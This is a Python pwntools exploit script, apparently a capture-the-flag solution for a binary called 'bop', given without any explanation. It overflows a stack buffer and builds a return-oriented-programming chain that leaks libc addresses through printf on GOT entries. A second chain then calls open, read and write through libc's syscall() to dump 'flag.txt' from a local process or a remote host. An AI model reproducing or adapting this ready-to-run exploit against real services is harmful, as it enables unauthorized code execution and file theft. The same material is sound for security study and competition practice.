from pwn import *
from time import sleep

file_path='./bop_patched'
gs="""
b *0x401365
"""
context.binary=e=ELF(file_path)
libc=e.libc
if args.DEBUG:
    context.log_level='debug'
if args.LOCAL:
    p=e.process()
if  args.LOCAL and args.GDB:
    gdb.attach(p,gdbscript=gs)
    pause()
if args.REMOTE:
    p=remote(args.HOST,int(args.PORT))
printf_plt=0x4010f0
pop_rdi_ret=0x00000000004013d3
ret=pop_rdi_ret+1
p.recv()
sleep(1)
p.sendline(b"A"*40+
p64(ret)+
p64(pop_rdi_ret)+p64(e.got.gets)+p64(printf_plt)+
p64(ret)+
p64(pop_rdi_ret)+p64(e.got.printf)+p64(printf_plt)+
p64(ret)+
p64(0x00000000004012F9)
)
sleep(1)
gets=int(p.recv(6)[::-1].hex(),16)
sleep(1)
printf=int(p.recv(6)[::-1].hex(),16)

libc.address=printf-libc.sym.printf
rw=libc.address+0x1ec000
pop_rdx_ret=libc.address+0x142c92
pop_rsi_ret=libc.address+0x2601f
pop_rcx=libc.address+0x00000000000420ef
log.info(f"gets @ {hex(gets)}")
log.info(f"printf @ {hex(printf)}")
log.info(f"gets @ {hex(libc.sym.gets)}") #check right libc

p.sendline(b"A"*40+
p64(pop_rdi_ret)+p64(rw)+p64(gets)+ #store "flag.txt"
p64(pop_rdi_ret)+p64(2)+p64(pop_rsi_ret)+p64(rw)+p64(pop_rdx_ret)+p64(0)+p64(libc.sym.syscall)+ #open
p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_ret)+p64(3)+p64(pop_rdx_ret)+p64(rw)+p64(pop_rcx)+p64(0x40)+p64(libc.sym.syscall)+ #read
p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_ret)+p64(1)+p64(pop_rdx_ret)+p64(rw)+p64(pop_rcx)+p64(0x40)+p64(libc.sym.syscall) #write
)
sleep(1)
p.sendline(b"flag.txt\x00")
sleep(1)
p.interactive()
